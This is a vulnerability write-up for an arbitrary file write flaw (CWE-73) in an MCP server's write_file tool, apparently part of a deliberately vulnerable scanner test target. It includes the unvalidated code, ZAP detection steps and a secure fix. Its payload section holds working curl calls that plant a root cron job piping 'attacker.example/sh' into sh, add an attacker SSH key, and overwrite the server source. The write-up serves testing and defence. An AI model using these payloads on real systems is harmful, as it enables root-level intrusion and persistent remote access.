# Arbitrary File Write — CWE-73

## Description

The `write_file` tool accepts a filesystem path and writes arbitrary content to it with no
validation. Because the server runs as root in Docker, an attacker can overwrite any file
on the container's filesystem: cron jobs, SSH authorized keys, the server's own source
code, `/etc/passwd`, etc.

## CWE

[CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)

## Vulnerable Code

```python
# tools/write_file.py
def write_file(path: str, content: str) -> str:
    with open(path, "w") as fh:   # no path validation whatsoever
        fh.write(content)
    return f"Written {len(content)} bytes to {path}"
```

## Example MCP Call

```bash
curl -s http://localhost:8000/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"write_file","arguments":{"path":"/tmp/hello.txt","content":"hello world"}},"id":1}'
```

Response:

```json
{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"Written 11 bytes to /tmp/hello.txt"}],"isError":false}}
```

## Payloads

### 1. Plant a cron-based reverse shell (as root)

```bash
curl -s http://localhost:8000/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"write_file","arguments":{"path":"/etc/cron.d/backdoor","content":"* * * * * root curl http://attacker.example/sh | sh\n"}},"id":2}'
```

### 2. Add an attacker SSH key

```bash
curl -s http://localhost:8000/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"write_file","arguments":{"path":"/root/.ssh/authorized_keys","content":"ssh-rsa AAAA...attacker@host\n"}},"id":3}'
```

### 3. Overwrite the server's own source (code execution via restart)

```bash
curl -s http://localhost:8000/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"write_file","arguments":{"path":"/app/server.py","content":"import os; os.system(\"id > /tmp/pwned\")"}},"id":4}'
```

## Expected Response

```
Written <N> bytes to <path>
```

Or one of the error messages if the directory does not exist or permissions are denied.

## ZAP Detection

ZAP should test the `path` parameter with:

- Absolute paths like `/tmp/zap-test-<random>.txt`
- Parent-traversal paths like `../../tmp/zap-test.txt`

After writing, ZAP can use the `read_file` tool to confirm the write succeeded. The tool
confirms exploitation by returning the expected `"Written N bytes to ..."` string.

## Secure Fix

Restrict writes to a specific directory and resolve the path to prevent traversal:

```python
import os

ALLOWED_DIR = "/app/data/uploads"

def write_file(path: str, content: str) -> str:
    abs_path = os.path.realpath(os.path.join(ALLOWED_DIR, path))
    if not abs_path.startswith(ALLOWED_DIR + os.sep):
        return "Error: path outside allowed directory"
    os.makedirs(os.path.dirname(abs_path), exist_ok=True)
    with open(abs_path, "w") as fh:
        fh.write(content)
    return f"Written {len(content)} bytes"
```
